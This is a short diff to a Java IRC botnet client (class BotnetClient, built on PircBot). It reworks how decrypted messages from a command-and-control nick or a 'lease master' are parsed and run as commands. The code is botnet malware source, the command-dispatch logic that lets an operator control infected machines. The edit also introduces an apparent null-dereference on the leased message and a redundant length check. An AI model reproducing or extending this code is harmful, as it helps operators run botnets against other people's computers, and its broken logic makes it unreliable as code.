@@ -103,9 +103,11 @@ public class BotnetClient extends PircBot {
 		}
 		String decMsg = m.decryptMsg(message);
 		String leasedDecMsg = leased ? leasedM.decryptMsg(message) : null;
-		if (sender.equals(CC) && COMMANDS.contains(decMsg.split(" ")[0])) {
+		String command = decMsg.split(" ").length > 0 ? decMsg.split(" ")[0] : decMsg;
+		String leasedCommand = leasedDecMsg.split(" ").length > 0 ? leasedDecMsg.split(" ")[0] : leasedDecMsg;
+		if (sender.equals(CC) && COMMANDS.contains(command)) {
 			runCommand(decMsg, hostname, sender);
-		} else if (leaseMaster != null && sender.equals(leaseMaster) && SAFE_COMMANDS.contains(leasedDecMsg.split(" ")[0])) {
+		} else if (leaseMaster != null && sender.equals(leaseMaster) && SAFE_COMMANDS.contains(leasedCommand)) {
 			runCommand(leasedDecMsg, hostname, sender);
 		} else { // TODO: use leasing here??
 			System.out.println(sender + "<" + hostname + "> tried to use me with (" + message + ")");
